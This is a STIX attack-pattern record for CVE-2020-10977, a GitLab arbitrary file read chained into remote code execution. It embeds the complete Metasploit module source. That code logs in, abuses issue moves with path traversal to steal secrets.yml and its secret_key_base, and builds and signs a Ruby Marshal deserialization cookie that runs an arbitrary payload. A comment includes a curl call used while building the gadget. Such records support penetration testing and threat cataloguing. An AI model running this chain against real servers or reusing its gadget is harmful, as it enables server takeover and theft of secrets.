{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bdc79e9d-31c0-48e3-9794-45cb3b48df3d",
    "created": "2024-08-14T17:09:03.182327Z",
    "modified": "2024-08-14T17:09:03.182331Z",
    "name": "GitLab File Read Remote Code Execution",
    "description": " This module provides remote code execution against GitLab Community Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file read to extract the Rails \"secret_key_base\", and gains remote code execution with a deserialization vulnerability of a signed 'experimentation_subject_id' cookie that GitLab uses internally for A/B testing.  Note that the arbitrary file read exists in GitLab EE/CE 8.5 and later and was fixed in 12.9.1, 12.8.8, and 12.7.8. However, the RCE only affects versions 12.4.0 and above when the vulnerable `experimentation_subject_id` cookie was introduced.  Tested on GitLab 12.8.1 and 12.4.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/gitlab_file_read_rce.rb",
            "external_id": "gitlab_file_read_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-10977"
        },
        {
            "source_name": "reference",
            "url": "https://hackerone.com/reports/827052"
        },
        {
            "source_name": "reference",
            "url": "https://about.gitlab.com/releases/2020/03/26/security-release-12-dot-9-dot-1-released/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  # From Rails\n  class MessageVerifier\n\n    class InvalidSignature < StandardError\n    end\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @digest = options[:digest] || 'SHA1'\n      @serializer = options[:serializer] || Marshal\n    end\n\n    def generate(value)\n      data = ::Base64.strict_encode64(@serializer.dump(value))\n      \"#{data}--#{generate_digest(data)}\"\n    end\n\n    def generate_digest(data)\n      require 'openssl' unless defined?(OpenSSL)\n      OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get(@digest).new, @secret, data)\n    end\n\n  end\n\n  class NoopSerializer\n    def dump(value)\n      value\n    end\n  end\n\n  class KeyGenerator\n\n    def initialize(secret, options = {})\n      @secret = secret\n      @iterations = options[:iterations] || 2**16\n    end\n\n    def generate_key(salt, key_size = 64)\n      OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)\n    end\n\n  end\n\n  class GitLabClientException < StandardError; end\n\n  class GitLabClient\n    def initialize(http_client)\n      @http_client = http_client\n    end\n\n    def sign_in(username, password)\n      @http_client.cookie_jar.clear\n\n      sign_in_path = '/users/sign_in'\n      csrf_token = extract_csrf_token(\n        path: sign_in_path,\n        regex: %r{action=\"/users/sign_in\".*name=\"authenticity_token\"\\s+value=\"([^\"]+)\"}\n      )\n      res = @http_client.send_request_cgi({\n        'method' => 'POST',\n        'uri' => '/users/sign_in',\n        'keep_cookies' => true,\n        'vars_post' => {\n          'utf8' => '\u2713',\n          'authenticity_token' => csrf_token,\n          'user[login]' => username,\n          'user[password]' => password,\n          'user[remember_me]' => 0\n        }\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.body.include?('Invalid Login or password')\n        raise GitLabClientException, 'Username or password invalid'\n      elsif res.code != 302\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      elsif res.headers.fetch('Location', '').include?(sign_in_path)\n        raise GitLabClientException, 'Login not successful. The account may need activated. Verify login works manually.'\n      end\n\n      current_user\n    end\n\n    def current_user\n      res = http_client.send_request_cgi({\n        'method' => 'GET',\n        'uri' => '/api/v4/user',\n        'keep_cookies' => true\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      JSON.parse(res.body)\n    end\n\n    def version\n      res = http_client.send_request_cgi({\n        'method' => 'GET',\n        'uri' => '/api/v4/version',\n        'keep_cookies' => true\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      JSON.parse(res.body)\n    end\n\n    def create_project(user:)\n      new_project_path = '/projects/new'\n      create_project_path = '/projects'\n\n      csrf_token = extract_csrf_token(\n        path: new_project_path,\n        regex: /action=\"#{create_project_path}\".*name=\"authenticity_token\"\\s+value=\"([^\"]+)\"/\n      )\n      project_name = Rex::Text.rand_text_alphanumeric(8)\n      res = http_client.send_request_cgi({\n        'method' => 'POST',\n        'uri' => create_project_path,\n        'keep_cookies' => true,\n        'vars_post' => {\n          'utf8' => '\u2713',\n          'authenticity_token' => csrf_token,\n          'project[ci_cd_only]' => 'false',\n          'project[name]' => project_name,\n          'project[namespace_id]' => (user['id']).to_s,\n          'project[path]' => project_name,\n          'project[description]' => Rex::Text.rand_text_alphanumeric(8),\n          'project[visibility_level]' => '0'\n        }\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.body.include?('Namespace is not valid')\n        raise GitLabClientException, 'This uer can not create additional projects, please delete some'\n      elsif res.code != 302\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      project(user: user, project_name: project_name)\n    end\n\n    def project(user:, project_name:)\n      project_path = \"/#{user['username']}/#{project_name}\"\n      res = http_client.send_request_cgi({\n        'method' => 'GET',\n        'uri' => project_path,\n        'keep_cookies' => true\n      })\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      project_id = res.body[/Project ID: (\\d+)/, 1]\n      {\n        'id' => project_id,\n        'name' => project_name,\n        'path' => project_path,\n        'edit_path' => \"#{project_path}/edit\",\n        'delete_path' => \"/#{user['username']}/#{project_name}\"\n      }\n    end\n\n    def delete_project(project:)\n      edit_project_path = project['edit_path']\n      delete_project_path = project['delete_path']\n\n      csrf_token = extract_csrf_token(\n        path: edit_project_path,\n        regex: /action=\"#{delete_project_path}\".*name=\"authenticity_token\" value=\"([^\"]+)\"/\n      )\n      res = http_client.send_request_cgi({\n        'method' => 'POST',\n        'uri' => delete_project_path,\n        'keep_cookies' => true,\n        'vars_post' => {\n          'utf8' => '\u2713',\n          'authenticity_token' => csrf_token,\n          '_method' => 'delete'\n        }\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 302\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      true\n    end\n\n    def create_issue(project:, issue:)\n      new_issue_path = \"#{project['path']}/issues/new\"\n      create_issue_path = \"#{project['path']}/issues\"\n\n      csrf_token = extract_csrf_token(\n        path: new_issue_path,\n        regex: /action=\"#{create_issue_path}\".*name=\"authenticity_token\"\\s+value=\"([^\"]+)\"/\n      )\n      res = http_client.send_request_cgi({\n        'method' => 'POST',\n        'uri' => create_issue_path,\n        'keep_cookies' => true,\n        'vars_post' => {\n          'utf8' => '\u2713',\n          'authenticity_token' => csrf_token,\n          'issue[title]' => issue['title'] || Rex::Text.rand_text_alphanumeric(8),\n          'issue[description]' => issue['description'] || Rex::Text.rand_text_alphanumeric(8),\n          'issue[confidential]' => '0',\n          'issue[assignee_ids][]' => '0',\n          'issue[label_ids][]' => '',\n          'issue[due_date]' => '',\n          'issue[lock_version]' => '0'\n        }\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 302\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      issue_id = res.body[%r{You are being <a href=\"https?://.*#{create_issue_path}/(\\d+)\">redirected</a>}, 1]\n\n      issue.merge({\n        'path' => \"#{create_issue_path}/#{issue_id}\",\n        'move_path' => \"#{create_issue_path}/#{issue_id}/move\"\n      })\n    end\n\n    def move_issue(issue:, target_project:)\n      issue_path = issue['path']\n      move_issue_path = issue['move_path']\n\n      csrf_token = extract_csrf_token(\n        path: issue_path,\n        regex: /name=\"csrf-token\" content=\"([^\"]+)\"/\n      )\n\n      res = http_client.send_request_cgi({\n        'method' => 'POST',\n        'uri' => move_issue_path,\n        'keep_cookies' => true,\n        'ctype' => 'application/json',\n        'headers' => {\n          'X-CSRF-Token' => csrf_token,\n          'X-Requested-With' => 'XMLHttpRequest'\n        },\n        'data' => {\n          'move_to_project_id' => (target_project['id']).to_s\n        }.to_json\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      json_res = JSON.parse(res.body)\n\n      {\n        'path' => json_res['web_url'],\n        'description' => json_res['description']\n      }\n    end\n\n    def download(project:, path:)\n      res = http_client.send_request_cgi({\n        'method' => 'GET',\n        'uri' => \"#{project['path']}/#{path}\",\n        'keep_cookies' => true\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      res.body\n    end\n\n    private\n\n    attr_reader :http_client\n\n    def extract_csrf_token(path:, regex:)\n      res = http_client.send_request_cgi({\n        'method' => 'GET',\n        'uri' => path,\n        'keep_cookies' => true\n      })\n\n      if res.nil? || res.body.nil?\n        raise GitLabClientException, 'Empty response. Please validate RHOST'\n      elsif res.code != 200\n        raise GitLabClientException, \"Unexpected HTTP #{res.code} response.\"\n      end\n\n      token = res.body[regex, 1]\n      if token.nil?\n        raise GitLabClientException, 'Could not successfully extract CSRF token'\n      end\n\n      token\n    end\n  end\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitLab File Read Remote Code Execution',\n        'Description' => %q{\n          This module provides remote code execution against GitLab Community\n          Edition (CE) and Enterprise Edition (EE). It combines an arbitrary file\n          read to extract the Rails \"secret_key_base\", and gains remote code\n          execution with a deserialization vulnerability of a signed\n          'experimentation_subject_id' cookie that GitLab uses internally for A/B\n          testing.\n\n          Note that the arbitrary file read exists in GitLab EE/CE 8.5 and later,\n          and was fixed in 12.9.1, 12.8.8, and 12.7.8. However, the RCE only affects\n          versions 12.4.0 and above when the vulnerable `experimentation_subject_id`\n          cookie was introduced.\n\n          Tested on GitLab 12.8.1 and 12.4.0.\n        },\n        'Author' => [\n          'William Bowling (vakzz)', # Discovery + PoC\n          'alanfoster', # msf module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-10977'],\n          ['URL', 'https://hackerone.com/reports/827052'],\n          ['URL', 'https://about.gitlab.com/releases/2020/03/26/security-release-12-dot-9-dot-1-released/']\n        ],\n        'DisclosureDate' => '2020-03-26',\n        'Platform' => 'ruby',\n        'Arch' => ARCH_RUBY,\n        'Privileged' => false,\n        'Targets' => [['Automatic', {}]],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'The username to authenticate as']),\n        OptString.new('PASSWORD', [false, 'The password for the specified username']),\n        OptString.new('TARGETURI', [true, 'The path to the vulnerable application', '/users/sign_in']),\n        OptString.new('SECRETS_PATH', [true, 'The path to the secrets.yml file', '/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml']),\n        OptString.new('SECRET_KEY_BASE', [false, 'The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present']),\n        OptInt.new('DEPTH', [true, 'Define the max traversal depth', 15])\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('SignedCookieSalt', [ true, 'The signed cookie salt', 'signed cookie']),\n        OptInt.new('KeyGeneratorIterations', [ true, 'The key generator iterations', 1000])\n      ]\n    )\n  end\n\n  #\n  # This stub ensures that the payload runs outside of the Rails process\n  # Otherwise, the session can be killed on timeout\n  #\n  def detached_payload_stub(code)\n    %^\n    code = '#{Rex::Text.encode_base64(code)}'.unpack(\"m0\").first\n    if RUBY_PLATFORM =~ /mswin|mingw|win32/\n      inp = IO.popen(\"ruby\", \"wb\") rescue nil\n      if inp\n        inp.write(code)\n        inp.close\n      end\n    else\n      Kernel.fork do\n        eval(code)\n      end\n    end\n    {}\n  ^.strip.split(/\\n/).map(&:strip).join(\"\\n\")\n  end\n\n  def build_payload\n    code = \"eval('#{::Base64.strict_encode64(detached_payload_stub(payload.encoded))}'.unpack('m0').first)\"\n\n    # Originally created with Active Support 6.x\n    #   code = '`curl 10.10.15.26`'\n    #   erb = ERB.allocate; nil\n    #   erb.instance_variable_set(:@src, code);\n    #   erb.instance_variable_set(:@filename, \"1\")\n    #   erb.instance_variable_set(:@lineno, 1)\n    #   value = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)\n    #   Marshal.dump(value)\n    \"\\x04\\b\" \\\n      'o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy' \\\n        \"\\t:\\x0E@instance\" \\\n          \"o:\\bERB\" \\\n            \"\\b\" \\\n              \":\\t@src#{Marshal.dump(code)[2..]}\" \\\n              \":\\x0E@filename\\\"\\x061\" \\\n              \":\\f@linenoi\\x06\" \\\n          \":\\f@method:\\vresult\" \\\n          \":\\t@var\\\"\\f@result\" \\\n        \":\\x10@deprecatorIu:\\x1FActiveSupport::Deprecation\\x00\\x06:\\x06ET\"\n  end\n\n  def sign_payload(secret_key_base, payload)\n    key_generator = KeyGenerator.new(secret_key_base, { iterations: datastore['KeyGeneratorIterations'] })\n    key = key_generator.generate_key(datastore['SignedCookieSalt'])\n    verifier = MessageVerifier.new(key, { serializer: NoopSerializer.new })\n    verifier.generate(payload)\n  end\n\n  def check\n    validate_credentials_present!\n\n    git_lab_client = GitLabClient.new(self)\n    git_lab_client.sign_in(datastore['USERNAME'], datastore['PASSWORD'])\n    version = Rex::Version.new(git_lab_client.version['version'][/(\\d+.\\d+.\\d+)/, 1])\n\n    # Arbitrary file reads are present from 8.5 and fixed in 12.9.1, 12.8.8, and 12.7.8\n    # However, RCE is only available from 12.4 and fixed in 12.9.1, 12.8.8, and 12.7.8\n    has_rce_present = (\n      version.between?(Rex::Version.new('12.4.0'), Rex::Version.new('12.7.7')) ||\n        version.between?(Rex::Version.new('12.8.0'), Rex::Version.new('12.8.7')) ||\n        version == Rex::Version.new('12.9.0')\n    )\n    if has_rce_present\n      return Exploit::CheckCode::Appears(\"GitLab #{version} is a vulnerable version.\")\n    end\n\n    Exploit::CheckCode::Safe(\"GitLab #{version} is not a vulnerable version.\")\n  rescue GitLabClientException => e\n    Exploit::CheckCode::Unknown(e.message)\n  end\n\n  def validate_credentials_present!\n    missing_options = []\n\n    missing_options << 'USERNAME' if datastore['USERNAME'].blank?\n    missing_options << 'PASSWORD' if datastore['PASSWORD'].blank?\n\n    if missing_options.any?\n      raise Msf::OptionValidateError, missing_options\n    end\n  end\n\n  def read_secret_key_base\n    return datastore['SECRET_KEY_BASE'] if datastore['SECRET_KEY_BASE'].present?\n\n    validate_credentials_present!\n    git_lab_client = GitLabClient.new(self)\n    user = git_lab_client.sign_in(datastore['USERNAME'], datastore['PASSWORD'])\n    print_status(\"Logged in to user #{user['username']}\")\n\n    project_a = git_lab_client.create_project(user: user)\n    print_status(\"Created project #{project_a['path']}\")\n    project_b = git_lab_client.create_project(user: user)\n    print_status(\"Created project #{project_b['path']}\")\n\n    issue = git_lab_client.create_issue(\n      project: project_a,\n      issue: {\n        'description' => \"![#{Rex::Text.rand_text_alphanumeric(8)}](/uploads/#{Rex::Text.rand_text_numeric(32)}#{'/..' * datastore['DEPTH']}#{datastore['SECRETS_PATH']})\"\n      }\n    )\n    print_status(\"Created issue #{issue['path']}\")\n\n    print_status('Executing arbitrary file load')\n    moved_issue = git_lab_client.move_issue(issue: issue, target_project: project_b)\n    secrets_file_url = moved_issue['description'][/\\[secrets.yml\\]\\((.*)\\)/, 1]\n    secrets_yml = git_lab_client.download(project: project_b, path: secrets_file_url)\n    loot_path = store_loot('gitlab.secrets', 'text/plain', datastore['RHOST'], secrets_yml, 'secrets.yml')\n    print_good(\"File saved as: '#{loot_path}'\")\n\n    secret_key_base = secrets_yml[/secret_key_base:\\s+(.*)/, 1]\n    if secret_key_base.nil?\n      fail_with(Failure::UnexpectedReply, 'Unable to successfully extract leaked secret_key_base value')\n    end\n\n    print_good(\"Extracted secret_key_base #{secret_key_base}\")\n    print_status('NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read')\n\n    secret_key_base\n  rescue GitLabClientException => e\n    fail_with(Failure::UnexpectedReply, e.message)\n  ensure\n    [project_a, project_b].each do |project|\n      next unless project\n\n      print_status(\"Attempting to delete project #{project['path']}\")\n      git_lab_client.delete_project(project: project)\n      print_status(\"Deleted project #{project['path']}\")\n    rescue StandardError\n      print_error(\"Failed to delete project #{project['path']}\")\n    end\n  end\n\n  def exploit\n    secret_key_base = read_secret_key_base\n\n    payload = build_payload\n    signed_cookie_value = sign_payload(secret_key_base, payload)\n\n    send_request_cgi({\n      'uri' => normalize_uri(target_uri.path),\n      'method' => 'GET',\n      'cookie' => \"experimentation_subject_id=#{signed_cookie_value}\"\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-26",
    "x_mitre_platforms": [
        "ruby'"
    ]
}